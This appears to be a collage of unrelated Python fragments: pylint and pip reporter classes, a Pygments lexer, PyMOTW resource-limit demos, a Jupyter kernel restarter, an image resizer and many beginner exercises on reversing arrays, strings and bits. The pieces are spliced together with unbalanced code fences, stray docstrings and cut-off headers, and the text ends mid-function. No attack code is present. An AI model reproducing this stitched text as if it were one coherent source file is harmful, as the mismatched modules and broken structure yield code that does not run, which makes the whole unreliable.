    sect.append(report_nodes.Table(children=lines, cols=2, rheaders=1))


def report_messages_by_module_stats(sect, stats, _):
    """make errors / warnings by modules report"""
    if len(stats["by_module"]) == 1:
        # don't print this report when we are analysing a single module
        raise exceptions.EmptyReportError()
    by_mod = collections.defaultdict(dict)
    for m_type in ("fatal", "error", "warning", "refactor", "convention"):
        total = stats[m_type]
        for module in stats["by_module"].keys():
            mod_total = stats["by_module"][module][m_type]
            if total == 0:
                percent = 0
            else:
                percent = float((mod_total) * 100) / total
            by_mod[module][m_type] = percent
    sorted_result = []
    for module, mod_info in by_mod.items():
        sorted_result.append(
            (
                mod_info["error"],
                mod_info["warning"],
                mod_info["refactor"],
                mod_info["convention"],
                module,
            )
        )
    sorted_result.sort()
    sorted_result.reverse()
    lines = ["module", "error", "warning", "refactor", "convention"]
    for line in sorted_result:
        # Don't report clean modules.
        if all(entry == 0 for entry in line[:-1]):
            continue
        lines.append(line[-1])
        for val in line[:-1]:
            lines.append("%.2f" % val)
    if len(lines) == 5:
        raise exceptions.EmptyReportError()
    sect.append(report_nodes.Table(children=lines, cols=5, rheaders=1))

from collections import defaultdict
from logging import getLogger
from typing import Any, DefaultDict

from pip._vendor.resolvelib.reporters import BaseReporter

from .base import Candidate, Requirement

logger = getLogger(__name__)


class PipReporter(BaseReporter):
    def __init__(self) -> None:
        self.backtracks_by_package: DefaultDict[str, int] = defaultdict(int)

        self._messages_at_backtrack = {
            1: (
                "pip is looking at multiple versions of {package_name} to "
                "determine which version is compatible with other "
                "requirements. This could take a while."
            ),
            8: (
                "pip is looking at multiple versions of {package_name} to "
                "determine which version is compatible with other "
                "requirements. This could take a while."
            ),
            13: (
                "This is taking longer than usual. You might need to provide "
                "the dependency resolver with stricter constraints to reduce "
                "runtime. If you want to abort this run, you can press "
                "Ctrl + C to do so. To improve how pip performs, tell us what "
                "happened here: https://pip.pypa.io/surveys/backtracking"
            ),
        }

    def backtracking(self, candidate: Candidate) -> None:
        self.backtracks_by_package[candidate.name] += 1

        count = self.backtracks_by_package[candidate.name]
        if count not in self._messages_at_backtrack:
            return

        message = self._messages_at_backtrack[count]
        logger.info("INFO: %s", message.format(package_name=candidate.name))


class PipDebuggingReporter(BaseReporter):
    """A reporter that does an info log for every event it sees."""

    def starting(self) -> None:
        logger.info("Reporter.starting()")

    def starting_round(self, index: int) -> None:
        logger.info("Reporter.starting_round(%r)", index)

    def ending_round(self, index: int, state: Any) -> None:
        logger.info("Reporter.ending_round(%r, state)", index)

    def ending(self, state: Any) -> None:
        logger.info("Reporter.ending(%r)", state)

    def adding_requirement(self, requirement: Requirement, parent: Candidate) -> None:
        logger.info("Reporter.adding_requirement(%r, %r)", requirement, parent)

    def backtracking(self, candidate: Candidate) -> None:
        logger.info("Reporter.backtracking(%r)", candidate)

    def pinning(self, candidate: Candidate) -> None:
        logger.info("Reporter.pinning(%r)", candidate)

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

from io import StringIO
from os import getcwd, linesep, sep
from typing import Dict, List

from pylint import interfaces
from pylint.message import Message
from pylint.reporters import BaseReporter


class GenericTestReporter(BaseReporter):
    """reporter storing plain text messages"""

    __implements__ = interfaces.IReporter

    def __init__(self):  # pylint: disable=super-init-not-called
        self.reset()

    def reset(self):
        self.message_ids: Dict = {}
        self.out = StringIO()
        self.path_strip_prefix: str = getcwd() + sep
        self.messages: List[str] = []

    def handle_message(self, msg: Message) -> None:
        """manage message of different type and in the context of path"""
        obj = msg.obj
        line = msg.line
        msg_id = msg.msg_id
        str_message: str = msg.msg
        self.message_ids[msg_id] = 1
        if obj:
            obj = ":%s" % obj
        sigle = msg_id[0]
        if linesep != "\n":
            # 2to3 writes os.linesep instead of using
            # the previously used line separators
            str_message = str_message.replace("\r\n", "\n")
        self.messages.append(f"{sigle}:{line:>3}{obj}: {str_message}")

    def finalize(self):
        self.messages.sort()
        for msg in self.messages:
            print(msg, file=self.out)
        result = self.out.getvalue()
        self.reset()
        return result

    # pylint: disable=unused-argument
    def on_set_current_module(self, module, filepath):
        pass

    # pylint: enable=unused-argument

    def display_reports(self, layout):
        """ignore layouts"""

    _display = None


class MinimalTestReporter(BaseReporter):
    def on_set_current_module(self, module, filepath):
        self.messages = []

    _display = None


class FunctionalTestReporter(BaseReporter):
    def on_set_current_module(self, module, filepath):
        self.messages = []

    def display_reports(self, layout):
        """Ignore layouts and don't call self._display()."""

    def _display(self, layout):
        pass

class BaseReporter(object):
    """Delegate class to provider progress reporting for the resolver."""

    def starting(self):
        """Called before the resolution actually starts."""

    def starting_round(self, index):
        """Called before each round of resolution starts.

        The index is zero-based.
        """

    def ending_round(self, index, state):
        """Called before each round of resolution ends.

        This is NOT called if the resolution ends at this round. Use `ending`
        if you want to report finalization. The index is zero-based.
        """

    def ending(self, state):
        """Called before the resolution ends successfully."""

    def adding_requirement(self, requirement, parent):
        """Called when adding a new requirement into the resolve criteria.

        :param requirement: The additional requirement to be applied to filter
            the available candidaites.
        :param parent: The candidate that requires ``requirement`` as a
            dependency, or None if ``requirement`` is one of the root
            requirements passed in from ``Resolver.resolve()``.
        """

    def backtracking(self, candidate):
        """Called when rejecting a candidate during backtracking."""

    def pinning(self, candidate):
        """Called when adding a candidate to the potential solution."""

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import collections

from pylint.exceptions import EmptyReportError
from pylint.reporters.ureports.nodes import Section


class ReportsHandlerMixIn:
    """a mix-in class containing all the reports and stats manipulation
    related methods for the main lint class
    """

    def __init__(self):
        self._reports = collections.defaultdict(list)
        self._reports_state = {}

    def report_order(self):
        """Return a list of reports, sorted in the order
        in which they must be called.
        """
        return list(self._reports)

    def register_report(self, reportid, r_title, r_cb, checker):
        """register a report

        reportid is the unique identifier for the report
        r_title the report's title
        r_cb the method to call to make the report
        checker is the checker defining the report
        """
        reportid = reportid.upper()
        self._reports[checker].append((reportid, r_title, r_cb))

    def enable_report(self, reportid):
        """disable the report of the given id"""
        reportid = reportid.upper()
        self._reports_state[reportid] = True

    def disable_report(self, reportid):
        """disable the report of the given id"""
        reportid = reportid.upper()
        self._reports_state[reportid] = False

    def report_is_enabled(self, reportid):
        """return true if the report associated to the given identifier is
        enabled
        """
        return self._reports_state.get(reportid, True)

    def make_reports(self, stats, old_stats):
        """render registered reports"""
        sect = Section("Report", "%s statements analysed." % (self.stats["statement"]))
        for checker in self.report_order():
            for reportid, r_title, r_cb in self._reports[checker]:
                if not self.report_is_enabled(reportid):
                    continue
                report_sect = Section(r_title)
                try:
                    r_cb(report_sect, stats, old_stats)
                except EmptyReportError:
                    continue
                report_sect.report_id = reportid
                sect.append(report_sect)
        return sect

    def add_stats(self, **kwargs):
        """add some stats entries to the statistic dictionary
        raise an AssertionError if there is a key conflict
        """
        for key, value in kwargs.items():
            if key[-1] == "_":
                key = key[:-1]
            assert key not in self.stats
            self.stats[key] = value
        return self.stats
```

```py Multiple image resizing techniques """
import numpy as np
from cv2 import destroyAllWindows, imread, imshow, waitKey


class NearestNeighbour:
    """
    Simplest and fastest version of image resizing.
    Source: https://en.wikipedia.org/wiki/Nearest-neighbor_interpolation
    """

    def __init__(self, img, dst_width: int, dst_height: int):
        if dst_width < 0 or dst_height < 0:
            raise ValueError("Destination width/height should be > 0")

        self.img = img
        self.src_w = img.shape[1]
        self.src_h = img.shape[0]
        self.dst_w = dst_width
        self.dst_h = dst_height

        self.ratio_x = self.src_w / self.dst_w
        self.ratio_y = self.src_h / self.dst_h

        self.output = self.output_img = (
            np.ones((self.dst_h, self.dst_w, 3), np.uint8) * 255
        )

    def process(self):
        for i in range(self.dst_h):
            for j in range(self.dst_w):
                self.output[i][j] = self.img[self.get_y(i)][self.get_x(j)]

    def get_x(self, x: int) -> int:
        """
        Get parent X coordinate for destination X
        :param x: Destination X coordinate
        :return: Parent X coordinate based on `x ratio`
        >>> nn = NearestNeighbour(imread("digital_image_processing/image_data/lena.jpg",
        ...                              1), 100, 100)
        >>> nn.ratio_x = 0.5
        >>> nn.get_x(4)
        2
        """
        return int(self.ratio_x * x)

    def get_y(self, y: int) -> int:
        """
        Get parent Y coordinate for destination Y
        :param y: Destination X coordinate
        :return: Parent X coordinate based on `y ratio`
        >>> nn = NearestNeighbour(imread("digital_image_processing/image_data/lena.jpg",
        ...                              1), 100, 100)
        >>> nn.ratio_y = 0.5
        >>> nn.get_y(4)
        2
        """
        return int(self.ratio_y * y)


if __name__ == "__main__":
    dst_w, dst_h = 800, 600
    im = imread("image_data/lena.jpg", 1)
    n = NearestNeighbour(im, dst_w, dst_h)
    n.process()

    imshow(
        f"Image resized from: {im.shape[1]}x{im.shape[0]} to {dst_w}x{dst_h}", n.output
    )
    waitKey(0)
    destroyAllWindows()

from tornado.ioloop import IOLoop
from tornado.netutil import ThreadedResolver

# When this module is imported, it runs getaddrinfo on a thread. Since
# the hostname is unicode, getaddrinfo attempts to import encodings.idna
# but blocks on the import lock. Verify that ThreadedResolver avoids
# this deadlock.

resolver = ThreadedResolver()
IOLoop.current().run_sync(lambda: resolver.resolve(u"localhost", 80))
```

````py
    pygments.lexers.resource
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexer for resource definition files.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import re

from pygments.lexer import RegexLexer, bygroups, words
from pygments.token import Comment, String, Number, Operator, Text, \
    Keyword, Name

__all__ = ['ResourceLexer']


class ResourceLexer(RegexLexer):
    """Lexer for `ICU Resource bundles
    <http://userguide.icu-project.org/locale/resources>`_.

    .. versionadded:: 2.0
    """
    name = 'ResourceBundle'
    aliases = ['resourcebundle', 'resource']
    filenames = []

    _types = (':table', ':array', ':string', ':bin', ':import', ':intvector',
              ':int', ':alias')

    flags = re.MULTILINE | re.IGNORECASE
    tokens = {
        'root': [
            (r'//.*?$', Comment),
            (r'"', String, 'string'),
            (r'-?\d+', Number.Integer),
            (r'[,{}]', Operator),
            (r'([^\s{:]+)(\s*)(%s?)' % '|'.join(_types),
             bygroups(Name, Text, Keyword)),
            (r'\s+', Text),
            (words(_types), Keyword),
        ],
        'string': [
            (r'(\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|\\U00[0-9a-f]{6}|'
             r'\\[0-7]{1,3}|\\c.|\\[abtnvfre\'"?\\]|\\\{|[^"{\\])+', String),
            (r'\{', String.Escape, 'msgname'),
            (r'"', String, '#pop')
        ],
        'msgname': [
            (r'([^{},]+)(\s*)', bygroups(Name, String.Escape), ('#pop', 'message'))
        ],
        'message': [
            (r'\{', String.Escape, 'msgname'),
            (r'\}', String.Escape, '#pop'),
            (r'(,)(\s*)([a-z]+)(\s*\})',
             bygroups(Operator, String.Escape, Keyword, String.Escape), '#pop'),
            (r'(,)(\s*)([a-z]+)(\s*)(,)(\s*)(offset)(\s*)(:)(\s*)(-?\d+)(\s*)',
             bygroups(Operator, String.Escape, Keyword, String.Escape, Operator,
                      String.Escape, Operator.Word, String.Escape, Operator,
                      String.Escape, Number.Integer, String.Escape), 'choice'),
            (r'(,)(\s*)([a-z]+)(\s*)(,)(\s*)',
             bygroups(Operator, String.Escape, Keyword, String.Escape, Operator,
                      String.Escape), 'choice'),
            (r'\s+', String.Escape)
        ],
        'choice': [
            (r'(=|<|>|<=|>=|!=)(-?\d+)(\s*\{)',
             bygroups(Operator, Number.Integer, String.Escape), 'message'),
            (r'([a-z]+)(\s*\{)', bygroups(Keyword.Type, String.Escape), 'str'),
            (r'\}', String.Escape, ('#pop', '#pop')),
            (r'\s+', String.Escape)
        ],
        'str': [
            (r'\}', String.Escape, '#pop'),
            (r'\{', String.Escape, 'msgname'),
            (r'[^{}]+', String)
        ]
    }

    def analyse_text(text):
        if text.startswith('root:table'):
            return 1.0

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import resource

LIMITS = [
    ('RLIMIT_CORE', 'core file size'),
    ('RLIMIT_CPU', 'CPU time'),
    ('RLIMIT_FSIZE', 'file size'),
    ('RLIMIT_DATA', 'heap size'),
    ('RLIMIT_STACK', 'stack size'),
    ('RLIMIT_RSS', 'resident set size'),
    ('RLIMIT_NPROC', 'number of processes'),
    ('RLIMIT_NOFILE', 'number of open files'),
    ('RLIMIT_MEMLOCK', 'lockable memory address'),
]

print('Resource limits (soft/hard):')
for name, desc in LIMITS:
    limit_num = getattr(resource, name)
    soft, hard = resource.getrlimit(limit_num)
    print('{:<23} {}/{}'.format(desc, soft, hard))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import resource
import time

RESOURCES = [
    ('ru_utime', 'User time'),
    ('ru_stime', 'System time'),
    ('ru_maxrss', 'Max. Resident Set Size'),
    ('ru_ixrss', 'Shared Memory Size'),
    ('ru_idrss', 'Unshared Memory Size'),
    ('ru_isrss', 'Stack Size'),
    ('ru_inblock', 'Block inputs'),
    ('ru_oublock', 'Block outputs'),
]

usage = resource.getrusage(resource.RUSAGE_SELF)

for name, desc in RESOURCES:
    print('{:<25} ({:<10}) = {}'.format(
        desc, name, getattr(usage, name)))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import resource
import sys
import signal
import time


# Set up a signal handler to notify us
# when we run out of time.
def time_expired(n, stack):
    print('EXPIRED :', time.ctime())
    raise SystemExit('(time ran out)')


signal.signal(signal.SIGXCPU, time_expired)

# Adjust the CPU time limit
soft, hard = resource.getrlimit(resource.RLIMIT_CPU)
print('Soft limit starts as  :', soft)

resource.setrlimit(resource.RLIMIT_CPU, (1, hard))

soft, hard = resource.getrlimit(resource.RLIMIT_CPU)
print('Soft limit changed to :', soft)
print()

# Consume some CPU time in a pointless exercise
print('Starting:', time.ctime())
for i in range(200000):
    for i in range(200000):
        v = i * i

# We should never make it this far
print('Exiting :', time.ctime())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import resource
import os

soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
print('Soft limit starts as  :', soft)

resource.setrlimit(resource.RLIMIT_NOFILE, (4, hard))

soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
print('Soft limit changed to :', soft)

random = open('/dev/random', 'r')
print('random has fd =', random.fileno())
try:
    null = open('/dev/null', 'w')
except IOError as err:
    print(err)
else:
    print('null has fd =', null.fileno())
````

````pyA basic in process kernel monitor with autorestarting.

This watches a kernel's state using KernelManager.is_alive and auto
restarts the kernel if it dies.```


```py
# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.
import warnings

from traitlets import Instance
from zmq.eventloop import ioloop

from jupyter_client.restarter import KernelRestarter


class IOLoopKernelRestarter(KernelRestarter):
    """Monitor and autorestart a kernel."""

    loop = Instance("tornado.ioloop.IOLoop")

    def _loop_default(self):
        warnings.warn(
            "IOLoopKernelRestarter.loop is deprecated in jupyter-client 5.2",
            DeprecationWarning,
            stacklevel=4,
        )
        return ioloop.IOLoop.current()

    _pcallback = None

    def start(self):
        """Start the polling of the kernel."""
        if self._pcallback is None:
            self._pcallback = ioloop.PeriodicCallback(
                self.poll,
                1000 * self.time_to_dead,
            )
            self._pcallback.start()

    def stop(self):
        """Stop the kernel polling."""
        if self._pcallback is not None:
            self._pcallback.stop()
            self._pcallback = None


class AsyncIOLoopKernelRestarter(IOLoopKernelRestarter):
    async def poll(self):
        if self.debug:
            self.log.debug("Polling kernel...")
        is_alive = await self.kernel_manager.is_alive()
        if not is_alive:
            if self._restarting:
                self._restart_count += 1
            else:
                self._restart_count = 1

            if self._restart_count >= self.restart_limit:
                self.log.warning("AsyncIOLoopKernelRestarter: restart failed")
                self._fire_callbacks("dead")
                self._restarting = False
                self._restart_count = 0
                self.stop()
            else:
                newports = self.random_ports_until_alive and self._initial_startup
                self.log.info(
                    "AsyncIOLoopKernelRestarter: restarting kernel (%i/%i), %s random ports",
                    self._restart_count,
                    self.restart_limit,
                    "new" if newports else "keep",
                )
                self._fire_callbacks("restart")
                await self.kernel_manager.restart_kernel(now=True, newports=newports)
                self._restarting = True
        else:
            if self._initial_startup:
                self._initial_startup = False
            if self._restarting:
                self.log.debug("AsyncIOLoopKernelRestarter: restart apparently succeeded")
            self._restarting = False
````

````py
    sphinx.testing.restructuredtext
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from os import path

from docutils import nodes
from docutils.core import publish_doctree

from sphinx.application import Sphinx
from sphinx.io import SphinxStandaloneReader
from sphinx.parsers import RSTParser
from sphinx.util.docutils import sphinx_domains


def parse(app: Sphinx, text: str, docname: str = 'index') -> nodes.document:
    """Parse a string as reStructuredText with Sphinx application."""
    try:
        app.env.temp_data['docname'] = docname
        reader = SphinxStandaloneReader()
        reader.setup(app)
        parser = RSTParser()
        parser.set_application(app)
        with sphinx_domains(app.env):
            return publish_doctree(text, path.join(app.srcdir, docname + '.rst'),
                                   reader=reader,
                                   parser=parser,
                                   settings_overrides={'env': app.env,
                                                       'gettext_compact': True})
    finally:
        app.env.temp_data.pop('docname', None)

# Write a function that searches a list of names(unsorted) for the name "Bob" and returns the location in the list. If Bob is not in the array, return -1.
#
# Examples:
#
# csWhereIsBob(["Jimmy", "Layla", "Bob"]) ➞ 2
# csWhereIsBob(["Bob", "Layla", "Kaitlyn", "Patricia"]) ➞ 0
# csWhereIsBob(["Jimmy", "Layla", "James"]) ➞ - 1
# Notes:
#
# Assume all names start with a capital letter and are lowercase thereafter(i.e. don't worry about finding "BOB" or "bob").
# [execution time limit] 4 seconds(py3)
#
# [input] array.string names
#
# [output] integer
#
# [Python 3] Syntax Tips
#
# # Prints help message to the console
# # Returns a string
#
#
# def helloWorld(name):
#     print("This prints to the console when you Run Tests")
#     return "Hello, " + name


def csWhereIsBob(names):
    bob = "Bob"
    if bob in names:
        return names.index("Bob")
    else:
        return -1

# def returnTwelve(n):
#     return n if n > 12 else 12

# n, = eval(dir()[0])
# return n if n > 12 else 12

returnTwelve = lambda n: 12 if n < 12 else n

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def lazy_sum(*args):
    def sum():
        ax = 0
        for n in args:
            ax = ax + n
        return ax

    return sum


f = lazy_sum(1, 2, 4, 5, 7, 8, 9)
print(f)
print(f())

# why f1(), f2(), f3() returns 9, 9, 9 rather than 1, 4, 9?
def count():
    fs = []
    for i in range(1, 4):

        def f():
            return i * i

        fs.append(f)
    return fs


f1, f2, f3 = count()

print(f1())
print(f2())
print(f3())

# fix:
def count():
    fs = []

    def f(n):
        def j():
            return n * n

        return j

    for i in range(1, 4):
        fs.append(f(i))
    return fs


f1, f2, f3 = count()

print(f1())
print(f2())
print(f3())

def csReverseString(chars):
    rev = chars[::-1]
    print(rev)
    return rev


# def csReverseString2(chars):
#     new_string = ''
#     index = len(chars)
#     while index:
#         index -= 1                    # index = index - 1
#         new_string += chars[index]  # new_string = new_string + character
#     return new_string
#
#
# print(csReverseString2("helloworld"))


def csReverseString2(chars):
    new_string = ""
    index = len(chars)
    while index:
        index -= 1  # index = index - 1
        new_string += chars[index]  # new_string = new_string + character
    return new_string


print(csReverseString2("helloworld"))

# Input:
# chars:
# ["r",
#  "o",
#  "b",
#  "o",
#  "t"]
# Output:
# undefined
# Expected Output:
# ["t",
#  "o",
#  "b",
#  "o",
#  "r"]
# Console Output:
# Empty
# Error Output:
# Empty
# ---------------------------------------------------------------------------

# Input:
# chars:
# ["8",
#  "9",
#  "f",
#  "9",
#  "V"]
# Output:
# ["V",
#  "9",
#  "f",
#  "9",
#  "8"]
# Expected Output:
# ["V",
#  "9",
#  "f",
#  "9",
#  "8"]
# Console Output:
# [u'V', u'9', u'f', u'9', u'8']
# Error Output:

def rev_word(inStr: str) -> str:
    return " ".join(inStr.split()[::-1])


print(rev_word("Python is kinda cool"))

# Print Output:
# cool kinda is Python
# Variables:
# {}

#!/bin/python3

import math
import os
import random
import re
import sys



#
# Complete the 'reverseArray' function below.
#
# The function is expected to return an INTEGER_ARRAY.
# The function accepts INTEGER_ARRAY arr as parameter.
#

def reverseArray(arr):
    # Write your code here
    front = 0
    rev = len(arr)-1
    while front < rev:
        arr[front], arr[rev] = arr[rev], arr[front]
        front += 1
        rev -= 1
    return arr

if __name__ == '__main__':
    fptr = open(os.environ['OUTPUT_PATH'], 'w')

    arr_count = int(input().strip())

    arr = []

    for _ in range(arr_count):
        arr_item = int(input().strip())
        arr.append(arr_item)

    result = reverseArray(arr)

    fptr.write('\n'.join(map(str, result)))
    fptr.write('\n')

    fptr.close()

getLi = [12, 43, 7, 43, 87, 89, 56, 9809, 9878, 56, 78, 98, True, 56, 76]
reverseList = getLi[::-1]  # [::-1] tells to step from end without difference
print(reverseList)

# Given an integer, write a function that reverses the bits (in binary) and returns the integer result.

# Examples:

# csReverseIntegerBits(417) -> 267
# 417 in binary is 110100001. Reversing the binary is 100001011, which is 267 in decimal.
# csReverseIntegerBits(267) -> 417
# csReverseIntegerBits(0) -> 0
# Notes:

# The input integer will not be negative.
# [execution time limit] 4 seconds (py3)

# [input] integer n

# [output] integer


def csReverseIntegerBits(n):
    reversed_num = 0
    while n > 0:
        reversed_num = reversed_num << 1
        if n & 1 == 1:
            reversed_num = reversed_num ^ 1
        n = n >> 1
    return reversed_num

def reverseList(head, tail):
    prev = None
    while prev != tail:
        prev, prev.next, head = head, prev, head.next
    return prev


def reverseNodesInKGroups(l, k):
    if k < 2:
        return l

    p = ListNode(-1)
    p.next = l
    ret = p
    while True:
        flag = True
        tmp = p
        for i in range(k):
            if tmp.next:
                tmp = tmp.next
            else:
                flag = False
                break

        if flag:
            q = tmp.next
            t = p.next
            reverseList(t, tmp)
            p.next = tmp
            t.next = q
            p = t
        else:
            break

    return ret.next

def reverseParentheses(s):

    bracket_pairs = []
    left_brackets_stack = []

    for i in range(len(s)):
        char = s[i]
        if char == "(":
            left_brackets_stack += [i]
        elif char == ")":
            left_bracket = left_brackets_stack[-1]
            del left_brackets_stack[-1]

            bracket_pairs += [(left_bracket, i)]

    # print(bracket_pairs)

    for b in bracket_pairs:
        left, right = b

        subs = s[left:right]
        subs = subs[::-1]
        s = s[:left] + subs + s[right:]
        # print(s)

    s = s.replace(")", "")
    s = s.replace("(", "")
    return s

def reverseSentence(sentence):
    list = sentence.split(" ")
    i, out = list.__len__() - 1, ""
    while i >= 0:
        out += list[i] + " "
        i -= 1
    return out[0:-1]
````

````py
Reverse All Lists

Return a list that contains the items in reverse, but so that whenever each item is
itself a list, its elements are also reversed. This reversal of sublists must keep going on all the way
down, no matter how deep the nesting of these lists,

Input: [1, [2, 3, 4, 'yeah'], 5]
Output: [5, ['yeah', 4, 3, 2], 1]

=========================================
This problem can be solved using queue, stack (or recursion). Use in place reversing and save all
inner lists for reversing later.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

from collections import deque


def reverse_all_lists(arr):
    queue = deque()
    queue.append(arr)

    while queue:
        inner_arr = queue.popleft()

        # in place reverse
        reverse_arr(inner_arr)

        # take all inner lists and save them for later
        for item in inner_arr:
            if isinstance(item, list):
                queue.append(item)

    # the arr is already reversed
    return arr


def reverse_arr(arr):
    start = 0
    end = len(arr) - 1

    while start < end:
        # reverse the array from the start index to the end index by
        # swaping each element with the pair from the other part of the array
        arr[start], arr[end] = arr[end], arr[start]
        start += 1
        end -= 1

    return arr


###########
# Testing #
###########

# Test 1
# Correct result => [5, ['yeah', 4, 3, 2], 1]
print(reverse_all_lists([1, [2, 3, 4, "yeah"], 5]))

# Test 2
# Correct result => [[[[['boo!'], 33], 17], 99], 42]
print(reverse_all_lists([42, [99, [17, [33, ["boo!"]]]]]))
````

````py
Reverse array

Reverse an array, in constant space and linear time complexity.

Input: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
Output: [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]

=========================================
Reverse the whole array by swapping pair letters in-place (first with last, second with second from the end, etc).
Exist 2 more "Pythonic" ways of reversing arrays/strings (but not in-place, they're creating a new list):
- reversed_arr = reversed(arr)
- reversed_arr = arr[::-1]
But I wanted to show how to implement a reverse algorithm step by step so someone will know how to implement it in other languages.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def reverse_arr(arr):
    start = 0
    end = len(arr) - 1

    while start < end:
        # reverse the array from the start index to the end index by
        # swaping each element with the pair from the other part of the array
        swap(arr, start, end)
        start += 1
        end -= 1

    return arr


def swap(arr, i, j):
    # swapping two elements from a same array
    arr[i], arr[j] = arr[j], arr[i]
    """same as
    temp = arr[i]
    arr[i] = arr[j]
    arr[j] = temp
    """


###########
# Testing #
###########

# Test 1
# Correct result => [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]
print(reverse_arr([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]))

# Test 2
# Correct result => [5, 4, 3, 2, 1]
print(reverse_arr([1, 2, 3, 4, 5]))
````

````py
Reverse Every Ascending Sublist

Create and return a new list that contains the same elements as the argument list items, but
reversing the order of the elements inside every maximal strictly ascending sublist

Input: [5, 7, 10, 4, 2, 7, 8, 1, 3]
Output: [10, 7, 5, 4, 8, 7, 2, 3, 1]
Output explanation: 5, 7, 10 => 10, 7, 5 ; 4 => 4; 2, 7, 8 => 8, 7, 2; 1, 3 => 3, 1

=========================================
Find the start and end of each sublist and reverse it in-place.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def reverse_ascending_sublists(arr):
    n = len(arr)
    if n == 0:
        return []

    start = 0

    for i in range(1, n):
        # check if this the end of the strictly ascending sublist
        if arr[i] < arr[i - 1]:
            reverse_arr(arr, start, i - 1)
            # a new sublist starts
            start = i

    reverse_arr(arr, start, n - 1)

    return arr


def reverse_arr(arr, start, end):
    while start < end:
        # reverse the array from the start index to the end index by
        # swaping each element with the pair from the other part of the array
        arr[start], arr[end] = arr[end], arr[start]
        start += 1
        end -= 1

    return arr


###########
# Testing #
###########

# Test 1
# Correct result => [5, 4, 3, 2, 1]
print(reverse_ascending_sublists([1, 2, 3, 4, 5]))

# Test 2
# Correct result => [5, 4, 3, 2, 1]
print(reverse_ascending_sublists([5, 4, 3, 2, 1]))

# Test 3
# Correct result => [10, 7, 5, 4, 8, 7, 2, 3, 1]
print(reverse_ascending_sublists([5, 7, 10, 4, 2, 7, 8, 1, 3]))

def get_reverse_bit_string(number: int) -> str:
    """
    return the bit string of an integer

    >>> get_reverse_bit_string(9)
    '10010000000000000000000000000000'
    >>> get_reverse_bit_string(43)
    '11010100000000000000000000000000'
    >>> get_reverse_bit_string(2873)
    '10011100110100000000000000000000'
    >>> get_reverse_bit_string("this is not a number")
    Traceback (most recent call last):
        ...
    TypeError: operation can not be conducted on a object of type str
    """
    if not isinstance(number, int):
        raise TypeError(
            "operation can not be conducted on a object of type "
            f"{type(number).__name__}"
        )
    bit_string = ""
    for _ in range(0, 32):
        bit_string += str(number % 2)
        number = number >> 1
    return bit_string


def reverse_bit(number: int) -> str:
    """
    Take in an 32 bit integer, reverse its bits,
    return a string of reverse bits

    result of a reverse_bit and operation on the integer provided.

    >>> reverse_bit(25)
    '00000000000000000000000000011001'
    >>> reverse_bit(37)
    '00000000000000000000000000100101'
    >>> reverse_bit(21)
    '00000000000000000000000000010101'
    >>> reverse_bit(58)
    '00000000000000000000000000111010'
    >>> reverse_bit(0)
    '00000000000000000000000000000000'
    >>> reverse_bit(256)
    '00000000000000000000000100000000'
    >>> reverse_bit(-1)
    Traceback (most recent call last):
        ...
    ValueError: the value of input must be positive

    >>> reverse_bit(1.1)
    Traceback (most recent call last):
        ...
    TypeError: Input value must be a 'int' type

    >>> reverse_bit("0")
    Traceback (most recent call last):
        ...
    TypeError: '<' not supported between instances of 'str' and 'int'
    """
    if number < 0:
        raise ValueError("the value of input must be positive")
    elif isinstance(number, float):
        raise TypeError("Input value must be a 'int' type")
    elif isinstance(number, str):
        raise TypeError("'<' not supported between instances of 'str' and 'int'")
    result = 0
    # iterator over [1 to 32],since we are dealing with 32 bit integer
    for _ in range(1, 33):
        # left shift the bits by unity
        result = result << 1
        # get the end bit
        end_bit = number % 2
        # right shift the bits by unity
        number = number >> 1
        # add that bit to our ans
        result = result | end_bit
    return get_reverse_bit_string(result)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

```py
Aim : The user enters a string , to implement
Reverse Cipher on the inputted string.
```

```py
# Reverse Cipher function to reverse the inputted string
def revers_cipher(input_string):
    # return the reversed string
    return input_string[::-1]


# getting input from the user
input_string = input("Enter the string which you would like to encrypt or decrypt : ")

# printing the output
print("The inputted String was ", input_string)
print("Reversed String is ", revers_cipher(input_string))
```

```py
Note : Since in reverse Cipher the working remains the same. i.e to reverse the
       inputted string , hence we haven't segregated encryption and decryption as inputs.
```

```py

```

```py
Sample input  : ok so it is cool
Sample output : looc si ti os ko

Explaination:
The user enters either an encrypted/decrypted string .
After the user has provided the input the variable in which the string
is stored is passed onto a Revers_cipher function.
The Revers_cipher function reverses the string and returns the reversed string.
```

```py

def reverse_array(arr, start, end):
    while start < end:
        arr[start], arr[end] = arr[end], arr[start]
        start += 1
        end -= 1


arr = [1, 2, 3, 4, 5, 6]
print("unreversed array: ")
print(arr)
print("reversed array:")
reverse_array(arr, 0, len(arr) - 1)
print(arr)

def reverseInParentheses(inputString):
    opening_brackets_indices = []

    # Iterate through string
    for i in range(len(inputString)):
        # Push opening brackets onto the stack
        if inputString[i] == "(":
            opening_brackets_indices.append(i)
        # Reverse the substring starting after the
